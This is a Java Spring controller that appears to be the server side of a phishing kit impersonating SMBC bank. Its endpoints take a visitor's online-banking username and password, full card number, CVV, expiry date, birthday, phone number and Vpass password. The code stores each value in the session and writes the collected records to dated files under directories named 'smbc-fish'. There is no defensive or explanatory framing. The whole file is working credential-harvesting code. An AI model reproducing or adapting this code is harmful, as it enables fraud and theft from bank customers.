package com.kidd.smbc.controller;

import cn.hutool.core.date.DateUtil;
import cn.hutool.core.util.RandomUtil;
import com.kidd.smbc.Utils.IpUtils;
import com.kidd.smbc.task.AsyncTask;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.time.Clock;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.Arrays;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;


@Controller
@RequestMapping("/pc")
public class SmbcPcController {

    @Autowired
    private HttpServletRequest request;

    @Autowired
    private HttpServletResponse response;

    @Autowired
    private AsyncTask asyncTask;

    @GetMapping("/index")
    public Object index(@RequestHeader("User-Agent") String ua, Model model) {
        return "pc-index";
    }

    @RequestMapping("/card")
    public Object card(@RequestHeader("User-Agent") String ua, Model model) {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
        if(null == userInfoMap){
            userInfoMap = new LinkedHashMap<>();
        }
        userInfoMap.put("username", params.get("username")[0]);
        userInfoMap.put("password", params.get("password")[0]);
        session.setAttribute("userInfo", userInfoMap);
        return "pc-card";
    }

    @RequestMapping("/debit")
    public Object debit(@RequestHeader("User-Agent") String ua, Model model) {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        LinkedHashMap<String, String> userInfoMap = (LinkedHashMap<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("cardNo", params.get("cardnum1")[0]
        +params.get("cardnum2")[0]
        +params.get("cardnum3")[0]
        +params.get("cardnum4")[0]);
        userInfoMap.put("cvv", params.get("card_3_pwd")[0]);
        userInfoMap.put("expire", String.format("%s/%s", params.get("valid_month")[0], params.get("valid_year")[0]));
        userInfoMap.put("birthday", String.format("%s-%s-%s",
                params.get("birthday_year")[0],
                params.get("birthday_month")[0],
                params.get("birthday_day")[0]));
        userInfoMap.put("phone", String.format("%s-%s-%s",
                params.get("phone1")[0],
                params.get("phone2")[0],
                params.get("phone3")[0]));
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/smbc-lack-fish/%s.txt", timeStr), userInfoMap);
        return "pc-debit";
    }

    @RequestMapping("/finish")
    public Object finish(@RequestHeader("User-Agent") String ua, Model model) {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        LinkedHashMap<String, String> userInfoMap = (LinkedHashMap<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("vpassLast4", params.get("card_4_pwd")[0]);
        userInfoMap.put("vpassPwd", params.get("Password")[0]);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/smbc-fish/%s.txt", timeStr), userInfoMap);
        addCookie("ip", IpUtils.getIpAddress(request));
        return "pc-finish";
    }

    public void addCookie(String key, String value) {
        Cookie cookie = new Cookie(key, value);//创建新cookie
        cookie.setMaxAge(60 * 60);// 设置存在时间为5分钟
        cookie.setPath("/");//设置作用域
        response.addCookie(cookie);//将cookie添加到response的cookie数组中返回给客户端
    }

}
